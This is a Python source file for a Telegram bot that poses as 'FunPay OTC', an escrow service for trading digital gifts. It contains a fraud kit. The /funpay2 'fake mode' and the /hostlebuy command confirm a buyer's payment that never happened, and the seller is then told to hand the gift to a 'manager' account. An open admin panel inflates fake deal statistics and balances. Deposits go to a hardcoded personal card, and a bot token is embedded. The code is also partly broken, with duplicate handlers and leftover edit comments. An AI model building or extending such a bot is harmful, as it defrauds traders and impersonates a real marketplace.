import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command, CommandStart
from aiogram.enums import ParseMode

# Обновленные данные
bot = Bot(token="8531227508:AAH0hraNjR-yS7_NHj4T29osDXgiqshYO38")
dp = Dispatcher()

# Хранение данных
user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
MANAGER_CARD = "2204 1201 3279 4013 - Маркин Ярослав"
BANNER_URL = "https://s4.iimage.su/s/08/ge2Mdk3xsEJWX46gzz9mR2PtIurOfg5mz6VqTiJ1.jpg"
SUPPORT_USERNAME = "@FunPaySupportOTC"

banned_users = set()
admin_states = {}
fake_mode_users = set()  # Для фейк-режима

# Генерация случайных значений
def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# Русские клавиатуры
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Наш сайт", url="https://funpay.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

# Английские клавиатуры
start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/FunPaySupportOTC")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_STARS")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes, cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

# Клавиатуры для сделок
buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

admin_payment_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Оплата получена", callback_data="admin_payment_ok")],
    [InlineKeyboardButton(text="❌ Оплата не получена", callback_data="admin_payment_fail")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Item sent", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

# Утилиты
async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    
    text = (
        "🎁 <b>FunPay OTC | Безопасные сделки</b>\n\n"
        "Надежный сервис для покупки и продажи цифровых подарков!\n\n"
        "✨ <b>Наши преимущества:</b>\n"
        "• Гарант безопасности сделок\n"
        "• Быстрые переводы в любой валюте\n"
        "• Поддержка 24/7\n"
        "• Простой и удобный интерфейс\n\n"
        "Выберите нужный раздел ниже:"
    ) if lang == "ru" else (
        "🎁 <b>FunPay OTC | Secure Deals</b>\n\n"
        "Reliable service for buying and selling digital gifts!\n\n"
        "✨ <b>Our advantages:</b>\n"
        "• Deal security guarantee\n"
        "• Fast transfers in any currency\n"
        "• 24/7 support\n"
        "• Simple and user-friendly interface\n\n"
        "Choose the desired section below:"
    )
    
    try:
        if message_id:
            await bot.edit_message_text(text=text, chat_id=chat_id, message_id=message_id, reply_markup=keyboard, parse_mode=ParseMode.HTML)
        else:
            await bot.send_photo(chat_id=chat_id, photo=BANNER_URL, caption=text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    except:
        await bot.send_message(chat_id=chat_id, text=text, reply_markup=keyboard, parse_mode=ParseMode.HTML)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup=None):
    try:
        await callback.message.edit_text(text=text, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    except:
        await callback.answer(text, show_alert=True)

async def handle_deal_join(message: Message, deal_id: str):
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        deal["buyer_id"] = buyer_id
        deal["buyer_username"] = buyer_username
        deal["status"] = "active"
        lang = user_languages.get(buyer_id, "ru")
        text = (
            "✅ Вы вошли в сделку как покупатель!\n\n"
            f"🆔 ID сделки: #{deal_id}\n"
            f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
            f"📝 Описание: {deal['description']}\n\n"
            "Оплатите по реквизитам менеджера и подтвердите:"
        ) if lang == "ru" else (
            "✅ You joined the deal as buyer!\n\n"
            f"🆔 Deal ID: #{deal_id}\n"
            f"💰 Amount: {deal['amount']} {deal['currency']}\n"
            f"📝 Description: {deal['description']}\n\n"
            "Pay to manager's details and confirm:"
        )
        await message.answer(text, reply_markup=buyer_deal_keyboard, parse_mode=ParseMode.HTML)
        
        seller_lang = user_languages.get(deal["seller_id"], "ru")
        seller_text = f"🔔 Покупатель @{buyer_username} вошел в сделку #{deal_id}!" if seller_lang == "ru" else f"🔔 Buyer @{buyer_username} joined deal #{deal_id}!"
        await bot.send_message(deal["seller_id"], seller_text)

# Команда /start
@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы заблокированы.")
        return
    if 'deal_' in message.text:
        deal_id = message.text.split('deal_')[1]
        await handle_deal_join(message, deal_id)
        return
    lang = user_languages.get(user_id, "ru")
    if user_id not in user_agreements:
        keyboard = start_keyboard_ru if lang == "ru" else start_keyboard_en
        text = (
            "📜 <b>Правила использования</b>\n\n"
            "1. Все сделки проводятся через гаранта.\n"
            "2. Запрещено мошенничество.\n"
            "3. Соблюдайте вежливость.\n\n"
            "Согласны?"
        ) if lang == "ru" else (
            "📜 <b>Terms of Use</b>\n\n"
            "1. All deals through guarantor.\n"
            "2. No fraud allowed.\n"
            "3. Be polite.\n\n"
            "Agree?"
        )
        await message.answer(text, reply_markup=keyboard, parse_mode=ParseMode.HTML)
    else:
        await send_main_menu(user_id, lang)

# --- ОБРАБОТЧИКИ КНОПОК (ЗАМЕНИТЬ ЭТОТ БЛОК) ---

@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    await callback.answer()  # <--- ВОТ ЭТА КОМАНДА
    user_agreements[callback.from_user.id] = True
    # ... остальной код

        
    user_agreements[callback.from_user.id] = True
    lang = user_languages.get(callback.from_user.id, "ru")
    
    text = (
        "🎉 <b>Вы успешно зарегистрированы в системе!</b>\n\n"
        "Теперь вам доступны все функции безопасных сделок FunPay OTC."
    ) if lang == "ru" else (
        "🎉 <b>You have successfully registered!</b>\n\n"
        "All FunPay OTC secure deal functions are now available to you."
    )
    
    await safe_edit_message(callback, text, welcome_keyboard_ru if lang == "ru" else welcome_keyboard_en)

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    await callback.answer()  # <--- И ТУТ
    lang = user_languages.get(callback.from_user.id, "ru")
    await send_main_menu(callback.message.chat.id, lang, callback.message.message_id)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    await callback.answer()  # <--- И ТУТ
    lang = user_languages.get(callback.from_user.id, "ru")
    # ... остальной код

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    lang = user_languages.get(callback.from_user.id, "ru")
    await send_main_menu(callback.message.chat.id, lang, callback.message.message_id)

@dp.message(Command("hostlebuy"))
async def hostlebuy_command(message: Message):
    args = message.text.split()
    if len(args) < 2:
        return await message.answer("⚠ Формат: `/hostlebuy ID_СДЕЛКИ`", parse_mode=ParseMode.MARKDOWN)

    deal_id = args[1].lower().replace("#", "")
    if deal_id in active_deals:
        deal = active_deals[deal_id]
        deal["status"] = "paid_fake"
        
        # Фикс: Отображаем ID, если нет юзернейма
        buyer_name = f"@{message.from_user.username}" if message.from_user.username else f"ID: {message.from_user.id}"
        
        await message.answer(f"✅ Оплата сделки #{deal_id} подтверждена.")
        await bot.send_message(deal["seller_id"], f"💰 Покупатель ({buyer_name}) оплатил сделку #{deal_id}!")
    else:
        await message.answer("❌ Сделка не найдена.")

# --- КОМАНДА /SIERRATEAM (ДОСТУПНА ВСЕМ) ---
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    # Доступно всем без исключения
    text = "🚀 <b>Sierra Team Control Panel</b>\n\nБот работает в штатном режиме. Управление сделками доступно через профиль."
    await message.answer(text, parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await send_main_menu(user_id, lang)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en
    text = "Выберите тип сделки:" if lang == "ru" else "Choose deal type:"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "deal_gift")
async def deal_gift_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = currency_keyboard_ru if lang == "ru" else currency_keyboard_en
    text = "Выберите валюту:" if lang == "ru" else "Choose currency:"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data.startswith("currency_"))
async def currency_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    currency = callback.data.split("_")[1]
    lang = user_languages.get(user_id, "ru")
    user_deals[user_id] = {"step": "amount", "currency": currency}
    text = "Введите сумму к оплате:" if lang == "ru" else "Enter amount:"
    await safe_edit_message(callback, text)

@dp.callback_query(F.data == "back_step")
async def back_step_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = deal_type_keyboard_ru if lang == "ru" else deal_type_keyboard_en
    text = "Выберите тип сделки:" if lang == "ru" else "Choose deal type:"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    await send_main_menu(user_id, lang)

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = profile_keyboard_ru if lang == "ru" else profile_keyboard_en
    stats = user_stats.get(user_id, {"successful": 0, "total": 0, "turnover": 0})
    balance = user_balances.get(user_id, 0)
    text = (
        f"👤 <b>Профиль</b>\n\n"
        f"💰 <b>Баланс:</b> {balance}\n"
        f"✅ <b>Успешные сделки:</b> {stats['successful']}\n"
        f"📊 <b>Общее кол-во сделок:</b> {stats['total']}\n"
        f"💸 <b>Оборот:</b> {stats['turnover']}"
    ) if lang == "ru" else (
        f"👤 <b>Profile</b>\n\n"
        f"💰 <b>Balance:</b> {balance}\n"
        f"✅ <b>Successful deals:</b> {stats['successful']}\n"
        f"📊 <b>Total deals:</b> {stats['total']}\n"
        f"💸 <b>Turnover:</b> {stats['turnover']}"
    )
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "deposit")
async def deposit_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = read_keyboard_ru if lang == "ru" else read_keyboard_en
    text = (
        "ℹ️ <b>Информация о пополнении</b>\n\n"
        "Пополнение осуществляется через менеджера @FunPaySupportOTC.\n"
        "Минимальная сумма: 100 RUB.\n"
        "Комиссия: 0%."
    ) if lang == "ru" else (
        "ℹ️ <b>Deposit Information</b>\n\n"
        "Deposit via manager @FunPaySupportOTC.\n"
        "Minimum amount: 100 RUB.\n"
        "Fee: 0%."
    )
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "read_deposit")
async def read_deposit_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = deposit_method_keyboard_ru if lang == "ru" else deposit_method_keyboard_en
    text = "Выберите метод пополнения:" if lang == "ru" else "Choose deposit method:"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "deposit_card")
async def deposit_card_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = (
        f"💳 <b>Пополнение картой</b>\n\n"
        f"Реквизиты: {MANAGER_CARD}\n\n"
        "После оплаты сообщите менеджеру."
    ) if lang == "ru" else (
        f"💳 <b>Deposit by card</b>\n\n"
        f"Details: {MANAGER_CARD}\n\n"
        "Notify manager after payment."
    )
    keyboard = back_keyboard_ru if lang == "ru" else back_keyboard_en
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "deposit_ton")
async def deposit_ton_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    ton_wallet = "UQ..."  # Замените на реальный кошелек
    text = (
        f"💎 <b>Пополнение TON</b>\n\n"
        f"Кошелек: {ton_wallet}\n\n"
        "После оплаты сообщите менеджеру."
    ) if lang == "ru" else (
        f"💎 <b>Deposit TON</b>\n\n"
        f"Wallet: {ton_wallet}\n\n"
        "Notify manager after payment."
    )
    keyboard = back_keyboard_ru if lang == "ru" else back_keyboard_en
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = (
        "💸 <b>Вывод средств</b>\n\n"
        "Введите сумму для вывода:"
    ) if lang == "ru" else (
        "💸 <b>Withdraw funds</b>\n\n"
        "Enter amount to withdraw:"
    )
    await safe_edit_message(callback, text)
    # Установите состояние для вывода, если нужно

@dp.callback_query(F.data == "requisites")
async def requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en
    text = "💳 <b>Реквизиты</b>" if lang == "ru" else "💳 <b>Requisites</b>"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "add_card")
async def add_card_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Введите номер карты в формате 0000 0000 0000 0000 - Имя Фамилия" if lang == "ru" else "Enter card number in format 0000 0000 0000 0000 - Name Surname"
    await safe_edit_message(callback, text)

@dp.callback_query(F.data == "add_ton")
async def add_ton_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    text = "Введите адрес TON кошелька:" if lang == "ru" else "Enter TON wallet address:"
    await safe_edit_message(callback, text)

@dp.callback_query(F.data == "view_requisites")
async def view_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    req = user_requisites.get(user_id, {})
    card = req.get("card", "Не добавлено")
    ton = req.get("ton", "Не добавлено")
    text = (
        f"💳 <b>Ваши реквизиты</b>\n\n"
        f"Карта: {card}\n"
        f"TON: {ton}"
    ) if lang == "ru" else (
        f"💳 <b>Your requisites</b>\n\n"
        f"Card: {card}\n"
        f"TON: {ton}"
    )
    keyboard = back_simple_keyboard_ru if lang == "ru" else back_simple_keyboard_en
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "back_to_requisites")
async def back_to_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    lang = user_languages.get(user_id, "ru")
    keyboard = requisites_keyboard_ru if lang == "ru" else requisites_keyboard_en
    text = "💳 <b>Реквизиты</b>" if lang == "ru" else "💳 <b>Requisites</b>"
    await safe_edit_message(callback, text, keyboard)

@dp.callback_query(F.data == "change_language")
async def change_language_callback(callback: CallbackQuery):
    text = "Выберите язык / Choose language:"
    await safe_edit_message(callback, text, language_keyboard)

@dp.callback_query(F.data == "lang_ru")
async def lang_ru_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_languages[user_id] = "ru"
    await send_main_menu(user_id, "ru")

@dp.callback_query(F.data == "lang_en")
async def lang_en_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user_languages[user_id] = "en"
    await send_main_menu(user_id, "en")

# Команда /funpay2
@dp.message(Command("funpay2"))
async def funpay2_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    fake_mode_users.add(user_id)
    await message.answer("✅ Фейк-режим оплаты включен. Теперь при нажатии 'Я оплатил' оплата будет подтверждена автоматически.")

# Команда /sierrateam
@dp.message(Command("sierrateam"))
async def sierrateam_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте за нарушением правил, пункт 3.1")
        return
    text = "👑 <b>Админ-панель FunPay OTC</b>\n\nОзнакомьтесь с правилами использования админ-панели."
    await message.answer(text, reply_markup=sierrateam_keyboard, parse_mode=ParseMode.HTML)

@dp.callback_query(F.data == "sierrateam_read")
async def sierrateam_read_callback(callback: CallbackQuery):
    text = "👑 <b>Админ-панель FunPay OTC</b>\n\nВыберите действие:"
    await safe_edit_message(callback, text, admin_keyboard)

# Админские callbacks
@dp.callback_query(F.data == "ban_user")
async def ban_user_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_ban_id"
    await safe_edit_message(callback, "Введите ID пользователя для блокировки:")

@dp.callback_query(F.data == "send_money")
async def send_money_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_send_money"
    await safe_edit_message(callback, "Введите: ID СУММА")

@dp.callback_query(F.data == "set_successful_deals")
async def set_successful_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_successful_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_total_deals")
async def set_total_deals_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_total_deals"
    await safe_edit_message(callback, "Введите: ID КОЛИЧЕСТВО")

@dp.callback_query(F.data == "set_turnover")
async def set_turnover_callback(callback: CallbackQuery):
    admin_states[callback.from_user.id] = "waiting_turnover"
    await safe_edit_message(callback, "Введите: ID СУММА")

# Callback для сделок
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("buyer_id") == user_id and deal["status"] == "active":
            if user_id in fake_mode_users:
                deal["status"] = "payment_confirmed"
                seller_lang = user_languages.get(deal["seller_id"], "ru")
                text = (
                    f"✅ <b>Оплата подтверждена!</b>\n\n"
                    f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                    f"После отправки нажмите кнопку ниже:"
                ) if seller_lang == "ru" else (
                    f"✅ <b>Payment confirmed!</b>\n\n"
                    f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                    f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                    f"After sending click button below:"
                )
                await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем отправки товара от продавца...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
            else:
                deal["status"] = "waiting_admin"
                await callback.message.edit_text(
                    "✅ <b>Оплата подтверждена!</b>\n\n"
                    "Ожидаем проверки администратора...\n"
                    "📞 <b>Поддержка:</b> @FunPaySupportOTC",
                    parse_mode=ParseMode.HTML
                )
                
                text = f"🧾 <b>Покупатель подтвердил оплату</b>\n\n🆔 <b>ID сделки:</b> #{deal_id}\n💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n👤 <b>Продавец:</b> @{deal['seller_username']}\n🛒 <b>Покупатель:</b> @{deal['buyer_username']}\n\n📞 <b>Поддержка:</b> @FunPaySupportOTC"
                await bot.send_message(user_id, text, reply_markup=admin_payment_keyboard, parse_mode=ParseMode.HTML)
                active_deals[deal_id]["admin_message_id"] = callback.message.message_id
            break

@dp.callback_query(F.data == "admin_payment_ok")
async def admin_payment_ok_callback(callback: CallbackQuery):
    for deal_id, deal in active_deals.items():
        if deal.get("status") == "waiting_admin":
            deal["status"] = "payment_confirmed"
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            text = (
                f"✅ <b>Оплата подтверждена!</b>\n\n"
                f"🆔 <b>ID сделки:</b> #{deal_id}\n"
                f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @FunPaySupportOTC\n\n"
                f"После отправки нажмите кнопку ниже:"
            ) if seller_lang == "ru" else (
                f"✅ <b>Payment confirmed!</b>\n\n"
                f"🆔 <b>Deal ID:</b> #{deal_id}\n"
                f"💰 <b>Amount:</b> {deal['amount']} {deal['currency']}\n\n"
                f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                f"⚠️ <b>IMPORTANT:</b> Send gift to manager @FunPaySupportOTC\n\n"
                f"After sending click button below:"
            )
            await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard, parse_mode=ParseMode.HTML)
            await callback.message.edit_text(
                "✅ <b>Оплата подтверждена администратором</b>\n\n"
                "Продавец уведомлен об отправке подарка.",
                parse_mode=ParseMode.HTML
            )
            break

@dp.callback_query(F.data == "item_sent")
async def item_sent_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in banned_users:
        await callback.answer("❌ Заблокирован", show_alert=True)
        return
        
    for deal_id, deal in active_deals.items():
        if deal.get("seller_id") == user_id and deal["status"] == "payment_confirmed":
            deal["status"] = "item_sent"
            text = "🔔 <b>Продавец отправил товар!</b>\n\nПожалуйста, проверьте получение и подтвердите:"
